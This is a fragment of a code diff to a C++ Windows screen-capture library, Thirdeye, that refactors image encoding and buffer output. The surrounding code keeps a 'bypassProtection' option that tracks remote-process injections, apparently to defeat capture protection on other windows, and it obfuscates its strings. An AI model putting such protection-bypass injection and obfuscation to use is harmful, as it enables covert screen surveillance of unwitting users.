-    BitBlt(hdcMemDC, 0, 0, w, h, hdcScreen, x, y, SRCCOPY);
+    ByteSink sink;
+    bool ok = CaptureEncoded(context, opts, &sink);
 
     if (opts.bypassProtection && hGlobalTrigger) {
         SetEvent(hGlobalTrigger.get());
-        std::thread([injections = std::move(injections)]() mutable {
-            CleanupInjections(injections);
-        }).detach();
+        StartCleanupThread(injections.items, injections.count);
     }
 
-    Bitmap bitmap(hbm, nullptr);
-
-    CLSID clsid;
-    const WCHAR* mimeType = GetMimeType(opts.format);
-    if (GetEncoderClsid(mimeType, &clsid) == -1) {
-        DeleteObject(hbm);
-        DeleteDC(hdcMemDC);
-        ReleaseDC(nullptr, hdcScreen);
-        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Image encoder not found")));
-        return THIRDEYE_ERROR_ENCODER_NOT_FOUND;
+    if (!ok) {
+        return THIRDEYE_ERROR_CAPTURE_FAILED;
     }
 
-    Status saveStatus;
-    if (opts.format == THIRDEYE_FORMAT_JPEG) {
-        EncoderParameters encoderParams;
-        ULONG quality = (ULONG)opts.quality;
-        encoderParams.Count = 1;
-        encoderParams.Parameter[0].Guid = EncoderQuality;
-        encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
-        encoderParams.Parameter[0].NumberOfValues = 1;
-        encoderParams.Parameter[0].Value = &quality;
-        saveStatus = bitmap.Save(filePath, &clsid, &encoderParams);
-    } else {
-        saveStatus = bitmap.Save(filePath, &clsid, nullptr);
+    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
+                               FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to open output file")));
+        return THIRDEYE_ERROR_SAVE_FAILED;
     }
-
-    DeleteObject(hbm);
-    DeleteDC(hdcMemDC);
-    ReleaseDC(nullptr, hdcScreen);
-
-    if (saveStatus != Ok) {
+    DWORD written = 0;
+    BOOL wok = WriteFile(hFile, sink.data, (DWORD)sink.size, &written, nullptr);
+    CloseHandle(hFile);
+    if (!wok || written != (DWORD)sink.size) {
         SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to save image")));
         return THIRDEYE_ERROR_SAVE_FAILED;
     }
@@ -865,7 +1112,7 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToBuffer(
     }
 
     HandleGuard hGlobalTrigger;
-    std::vector<RemoteContext> injections;
+    InjectionList injections = {};
     if (opts.bypassProtection) {
         hGlobalTrigger = HandleGuard(CreateEventA(nullptr, TRUE, FALSE, nullptr));
         if (hGlobalTrigger) {
@@ -873,56 +1120,27 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToBuffer(
         }
     }
 
-    IStream* stream = nullptr;
-    if (CreateStreamOnHGlobal(nullptr, TRUE, &stream) != S_OK) {
-        if (opts.bypassProtection && hGlobalTrigger) {
-            SetEvent(hGlobalTrigger.get());
-            std::thread([injections = std::move(injections)]() mutable {
-                CleanupInjections(injections);
-            }).detach();
-        }
-        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to create memory stream")));
-        return THIRDEYE_ERROR_ALLOCATION_FAILED;
-    }
-
-    ThirdeyeResult result = CaptureScreenToStream(context, stream, &opts);
+    ByteSink sink;
+    bool ok = CaptureEncoded(context, opts, &sink);
 
     if (opts.bypassProtection && hGlobalTrigger) {
         SetEvent(hGlobalTrigger.get());
-        std::thread([injections = std::move(injections)]() mutable {
-            CleanupInjections(injections);
-        }).detach();
+        StartCleanupThread(injections.items, injections.count);
     }
 
-    if (result != THIRDEYE_OK) {
-        stream->Release();
-        return result;
+    if (!ok) {
+        return THIRDEYE_ERROR_CAPTURE_FAILED;
     }
 
-    STATSTG stat;
-    if (stream->Stat(&stat, STATFLAG_NONAME) != S_OK) {
-        stream->Release();
-        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to get stream size")));
-        return THIRDEYE_ERROR_ALLOCATION_FAILED;
-    }
-
-    uint32_t dataSize = (uint32_t)stat.cbSize.QuadPart;
-
-    uint8_t* outBuffer = (uint8_t*)malloc(dataSize);
+    uint8_t* outBuffer = (uint8_t*)malloc(sink.size);
     if (!outBuffer) {
-        stream->Release();
         SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to allocate output buffer")));
         return THIRDEYE_ERROR_ALLOCATION_FAILED;
     }
-
-    LARGE_INTEGER zero = {0};
-    stream->Seek(zero, STREAM_SEEK_SET, nullptr);
-    ULONG bytesRead = 0;
-    stream->Read(outBuffer, dataSize, &bytesRead);
-    stream->Release();
+    memcpy(outBuffer, sink.data, sink.size);
 
     *buffer = outBuffer;
-    *size = dataSize;
+    *size = (uint32_t)sink.size;
 
     return THIRDEYE_OK;
 }
